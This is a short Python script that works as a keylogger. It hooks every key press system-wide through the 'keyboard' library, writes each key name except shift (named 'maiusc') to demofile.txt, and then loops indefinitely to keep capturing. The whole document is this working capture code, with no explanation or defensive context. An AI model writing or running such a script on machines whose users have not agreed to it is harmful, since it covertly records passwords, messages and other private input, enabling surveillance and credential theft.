import keyboard

with open("demofile.txt", "w") as f:
    
    def callback_onclick(k: keyboard.KeyboardEvent):
        if k.event_type == keyboard.KEY_DOWN:
            if k.name != 'maiusc':
                f.write(k.name)

    keyboard.hook(callback_onclick)

    while True:
        pass